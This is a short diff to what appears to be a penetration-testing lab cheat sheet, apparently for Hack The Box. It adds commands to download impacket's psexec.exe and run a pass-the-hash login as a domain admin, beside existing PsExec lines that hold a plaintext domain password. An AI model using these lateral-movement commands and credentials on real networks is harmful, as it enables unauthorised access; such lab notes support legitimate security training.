@@ -504,6 +504,9 @@ wget https://download.sysinternals.com/files/PSTools.zip
 
 .\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
 
+wget https://github.com/maaaaz/impacket-examples-windows/raw/master/psexec.exe
+.\psexec.exe htb.local/tom_admin@10.10.164.146 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
+
 # OTH
 net use \\files04
 .\PsExec64.exe \\PC1 cmd --accepteula
